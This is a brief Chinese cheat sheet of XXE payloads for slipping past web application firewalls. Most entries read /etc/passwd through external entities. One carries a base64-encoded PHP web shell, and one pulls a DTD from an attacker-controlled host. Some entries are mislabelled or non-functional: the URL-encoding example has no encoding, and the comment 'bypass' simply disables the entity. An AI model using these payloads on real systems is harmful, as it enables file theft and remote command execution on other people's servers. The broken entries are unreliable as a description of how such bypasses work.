# XXE WAF绕过

## 基础绕过

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## 编码绕过

### Base64编码

```xml
<!ENTITY xxe SYSTEM "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+">
```

### URL编码

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

## 绕过DTD

### 内部DTD

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
```

## 特殊字符

### 空格处理

```xml
<!ENTITY   xxe   SYSTEM   "file:///etc/passwd">
```

---

## 绕过过滤

### 注释绕过

```xml
<!--<!ENTITY xxe SYSTEM "file:///etc/passwd">-->
```

### 变形声明

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
```
